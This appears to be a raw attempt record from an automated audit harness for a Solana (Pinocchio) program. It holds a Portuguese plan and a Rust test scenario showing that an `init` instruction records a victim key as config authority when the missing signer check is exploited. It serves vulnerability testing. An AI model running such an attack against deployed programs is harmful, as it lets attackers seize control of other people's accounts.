attempts.raw:
{
  "plan": "O programa `init` (Pinocchio) grava a chave de `accounts[1]` como autoridade da config sem verificar `is_signer`. O baseline usa a instrucao `init` com a autoridade legitima assinando, provando que o cenario esta montado corretamente. O ataque repete a mesma chamada, mas com a chave da autoridade vitima em `accounts[1]` sem assinar. O efeito mede que a autoridade gravada na config e a chave da vitima, demonstrando que o atacante assumiu o controle sem a assinatura da autoridade.",
  "scenario": "let config_key = Pubkey::new_unique();
let authority_key = Pubkey::new_unique();

let config_data = vec![0u8; 49];
let config_account = account(&env.program_id, &config_data, None);

let baseline_ix = env.raw_ix(
    &[0u8],
    &[
        AccountMeta::new(config_key, true),
        AccountMeta::new_readonly(authority_key, true),
    ],
);
let baseline_accounts = vec![
    (config_key, config_account.clone()),
    (authority_key, wallet(1_000_000)),
];
let baseline_result = env.baseline("init legitimo com autoridade assinando", &baseline_ix, &baseline_accounts);

let victim_key = Pubkey::new_unique();
let attack_config_key = Pubkey::new_unique();
let attack_config_data = vec![0u8; 49];
let attack_config_account = account(&env.program_id, &attack_config_data, None);

let attack_ix = env.raw_ix(
    &[0u8],
    &[
        AccountMeta::new(attack_config_key, true),
        AccountMeta::new_readonly(victim_key, false),
    ],
);
let attack_accounts = vec![
    (attack_config_key, attack_config_account),
    (victim_key, wallet(1_000_000)),
];
let attack_result = env.attack("init grava autoridade vitima sem assinatura", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let stored_authority = read_pubkey(after(&attack_result, &attack_config_key).data(), 8);
    env.effect(
        "config gravou a chave da vitima como autoridade sem que ela assinasse",
        stored_authority == victim_key,
    );
}"
}

